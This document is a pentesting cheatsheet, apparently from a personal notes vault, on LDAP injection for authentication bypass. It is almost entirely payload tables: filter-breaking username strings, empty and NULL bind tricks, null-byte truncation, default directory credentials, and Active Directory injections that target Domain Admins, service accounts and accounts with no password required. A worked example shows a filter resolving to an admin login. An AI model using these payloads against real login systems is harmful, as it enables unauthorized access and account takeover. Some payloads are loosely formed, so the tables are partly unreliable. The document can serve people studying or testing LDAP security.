---
aliases:
  - LDAP Auth Bypass
  - LDAP Login Bypass
  - LDAP Empty Bind
tags:
  - type/cheatsheet
  - vuln/ldap-injection
  - vuln/auth-bypass
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[LDAP Injection]]'
---
# LDAP Injection - Auth Bypass

***

## Sub-Filter Injection en Login

| **Username payload** | **Password** | **Notas** |
|:---:|:---:|:---:|
| `*)(uid=*))(\|(uid=*` | `anything` | Cierra filtro original, agrega `OR` con wildcard match. |
| `*)(\|(uid=*` | `anything` | Variant más simple. |
| `admin)(&)` | `anything` | Cierra filter como admin + `&` (AND con true). |
| `admin)(\|(&` | `password` | Different ending. |
| `*)(cn=*` | `anything` | Wildcard en CN. |
| `admin*` | `password` | Wildcard match en username. |
| `admin)(\|(uid=admin)(uid=admin` | `password` | Multi-OR. |
| `admin))(\|(\|(uid=*` | `*` | Force OR true with wildcard pass. |
| `*` | `*` | Both wildcards (rare working). |
| `*)(&` | `*)` | Combine pass injection. |
| `admin)(uid=admin*)` | `password` | Specific user with wildcard. |
| Para `&(cn={user})(password={pass})` filter | `username=*)(cn=*` + `password=*)(cn=*` | Both fields injection. |
| Para `(&(uid={user})(userPassword={pass}))` | `username=*)(uid=*))(\|(uid=*` + `password=*` | Standard. |
^ldap-bypass-subfilter

### Filter típico vulnerable

```
# Backend filter:
(&(uid={username})(userPassword={password}))

# Atacante envía:
username = *)(uid=*))(|(uid=*
password = anything

# Filter resuelto:
(&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
       ^ true     ^ true (matches all users)

# Resultado: filtra entrega ALL users → first match = admin → login as admin
```

___

## Empty / NULL Bind

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Empty username + empty password | `username=&password=` | Some servers permit anonymous bind. |
| NULL bind | Send `BindRequest` con name="" y password="" | RFC permits anonymous. |
| Anonymous bind enabled | Server config issue | Not real injection but common bug. |
| Empty password con valid user | `username=admin&password=` | LDAP behavior — empty pass = anonymous → server may auth as admin. |
| Tab/whitespace pass | `username=admin&password= ` (just space) | Some servers strip → anonymous. |
| Null byte truncation | `username=admin\x00&password=any` | Truncate after null. |
| Encoded NUL | `username=admin%00&password=` | URL-encoded. |
| Mixed empty | `username= &password=` | Whitespace handling. |
| Bind type confusion | Server expects simple bind, atacante sends SASL | Edge. |
| Default credentials | `cn=admin`/`admin`, `cn=manager`/`secret`, `cn=Directory Manager`/`<empty>` | Common weak passwords. |
^ldap-bypass-emptybind

___

## Filter Manipulation Variants

| **Filter type** | **Bypass** | **Notas** |
|:---:|:---:|:---:|
| `(&(uid={u})(pass={p}))` | `username=*)(\|(uid=*` + `password=*` | Standard AND filter. |
| `(\|(uid={u})(mail={u}))` (OR filter) | `username=admin*` (wildcard match) | OR auto-permits. |
| `(uid={u})` simple | `username=*` (wildcard) | Single attr filter. |
| `(&(uid={u})(active=true))` | `username=*)(active=*` | Skip active check. |
| `(&(uid={u})(memberOf=cn=admin,...))` | `username=*)(memberOf=*` | Group bypass. |
| Encoded chars en filter | `username=%2A%29%28uid%3D%2A` | URL-encoded `*)(uid=*`. |
| Substring filter | `(uid=*{u}*)` (allows partial) | Already wildcards. |
| Approx filter `~=` | `(uid~={u})` (phonetic match) | Less strict. |
| Bitwise filter | `(userAccountControl:1.2.840.113556.1.4.803:=512)` | AD-specific OID. |
| Extensible match | `(uid:dn:caseIgnoreMatch:=admin)` | Power feature → injection candidate. |
^ldap-bypass-filter-types

___

## Active Directory-Specific Bypass

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| `samAccountName` injection | `*)(samAccountName=*` | AD user attribute. |
| `userPrincipalName` (UPN) | `*)(userPrincipalName=*` | UPN format. |
| Domain DN traversal | `username=*)(distinguishedName=*` | DN structure. |
| `objectSid` enum | `*)(objectSid=*` | SID-based filter. |
| `memberOf` group inject | `*)(memberOf=CN=Domain Admins,*` | Group escalation. |
| `userAccountControl` flag | `*)(userAccountControl:1.2.840.113556.1.4.803:=8192` | Account flags (e.g. NEVER_EXPIRE). |
| Disabled accounts | `*)(userAccountControl:1.2.840.113556.1.4.803:=2)` | Show disabled. |
| Service accounts | `*)(servicePrincipalName=*` | SPN enum. |
| Password not required | `*)(userAccountControl:1.2.840.113556.1.4.803:=32)` | PWD_NOTREQD bypass. |
| LDAP admin SDHolder bypass | Default templates — niche | AD specific. |
^ldap-bypass-ad

***
